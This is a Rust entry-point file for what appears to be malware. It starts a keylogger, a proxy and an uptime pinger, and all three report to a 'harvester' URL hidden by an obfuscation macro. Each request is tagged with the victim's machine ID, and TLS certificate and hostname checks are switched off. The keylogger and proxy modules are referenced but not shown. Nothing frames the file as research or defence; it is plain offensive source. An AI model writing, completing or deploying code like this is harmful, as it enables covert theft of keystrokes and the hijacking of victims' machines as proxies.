use std::{
    future::pending,
    sync::{
        Arc,
        atomic::{AtomicU64, Ordering},
    },
    time::Duration,
};

use env_logger::Env;
use log::info;
use muddy::muddy;
use once_cell::sync::Lazy;
use reqwest::{
    Client,
    header::{HeaderMap, HeaderValue},
};

mod uptime_pinger;
use tokio::time::sleep;
pub use uptime_pinger::uptime_pinger;

mod keylogger;
pub use keylogger::keylogger;

mod proxy;
pub use proxy::proxy;

static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
static MACHINE_ID: Lazy<String> =
    Lazy::new(|| machine_uid::machine_id::get_machine_id().unwrap_or("unknown".into()));
const REQ_FEEDBACK_SPEED_SECS: u64 = 60;

pub struct GlobalState {
    request_counter: AtomicU64,
}

#[tokio::main]
async fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();
    info!("outlet inited with machine id: {:?}", *MACHINE_ID);

    let global_state = Arc::new(GlobalState {
        request_counter: 0.into(),
    });

    {
        let global_state = global_state.clone();
        tokio::spawn(async move {
            loop {
                let old = global_state.request_counter.load(Ordering::Relaxed);
                sleep(Duration::from_secs(REQ_FEEDBACK_SPEED_SECS)).await;
                let new = global_state.request_counter.load(Ordering::Relaxed);
                info!(
                    "requests per {REQ_FEEDBACK_SPEED_SECS} seconds : {}",
                    new - old
                );
            }
        });
    }

    let mut headers = HeaderMap::new();
    headers.insert("machine-id", HeaderValue::from_str(&MACHINE_ID).unwrap());
    let reqwest_client = Client::builder()
        .default_headers(headers)
        .danger_accept_invalid_hostnames(true)
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(0)
        .connect_timeout(Duration::from_secs(5))
        .timeout(Duration::from_secs(20))
        .pool_idle_timeout(Duration::from_secs(0))
        .build()
        .unwrap();

    uptime_pinger(reqwest_client.clone());
    keylogger(reqwest_client.to_owned());
    proxy(reqwest_client.to_owned(), global_state);

    info!("successfully inited, running forever!");
    pending::<()>().await;
}
